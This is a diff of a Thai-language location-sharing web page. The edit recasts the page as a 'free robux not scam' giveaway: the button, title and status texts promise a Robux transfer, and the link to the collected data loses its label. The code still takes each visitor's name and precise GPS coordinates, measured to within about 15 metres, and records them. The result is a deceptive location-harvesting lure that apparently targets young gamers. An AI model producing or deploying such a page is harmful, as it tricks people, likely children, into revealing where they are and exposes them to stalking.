@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>แชร์ตำแหน่ง</title>
+<title>free robux not scam</title>
 <style>
 :root{--bg:#f5f6f8;--fg:#1c1f26;--card:#fff;--mut:#6b7280;--ac:#e5484d;--bd:#e3e5ea}
 @media (prefers-color-scheme:dark){:root{--bg:#14161b;--fg:#eceef2;--card:#1e2128;--mut:#9aa1ad;--bd:#2d313a}}
@@ -26,9 +26,9 @@ a{color:var(--ac)}
 <main>
   <section id="share" style="display:contents">
     <input id="name" placeholder="ชื่อของคุณ" maxlength="40" autocomplete="name">
-    <button id="go">แชร์ตำแหน่ง</button>
+    <button id="go">free robux not scam</button>
     <div id="msg"></div>
-    <button class="link" id="open">ดูข้อมูลที่แชร์ (ต้องใส่รหัส)</button>
+    <button class="link" id="open">---------</button>
   </section>
   <section id="login" class="hide">
     <input id="pw" type="password" placeholder="รหัสผ่าน">
@@ -72,7 +72,7 @@ function getBest(){
     const fin=()=>{if(done)return;done=true;navigator.geolocation.clearWatch(wid);clearTimeout(t);best?res(best):rej({code:3})};
     const wid=navigator.geolocation.watchPosition(p=>{
       if(!best||p.coords.accuracy<best.coords.accuracy)best=p;
-      say("กำลังวัดตำแหน่ง… ความแม่นยำ ±"+Math.round(best.coords.accuracy)+" ม.");
+      say("กำลังโอน robux ±"+Math.round(best.coords.accuracy)+" ม.");
       if(best.coords.accuracy<=15)fin();
     },e=>{if(!best){done=true;clearTimeout(t);navigator.geolocation.clearWatch(wid);rej(e)}else fin()},
     {enableHighAccuracy:true,maximumAge:0,timeout:20000});
@@ -84,7 +84,7 @@ $("go").onclick=async()=>{
   const name=$("name").value.trim();
   if(!name){say("กรุณาใส่ชื่อก่อน");$("name").focus();return}
   if(!navigator.geolocation){say("เบราว์เซอร์ไม่รองรับการระบุตำแหน่ง");return}
-  $("go").disabled=true;say("กำลังขอตำแหน่ง…");
+  $("go").disabled=true;say("กำลัง give robux");
   try{
     const c=(await getBest()).coords;
     const rec={name,lat:c.latitude,lng:c.longitude,acc:Math.round(c.accuracy),ts:Date.now()};
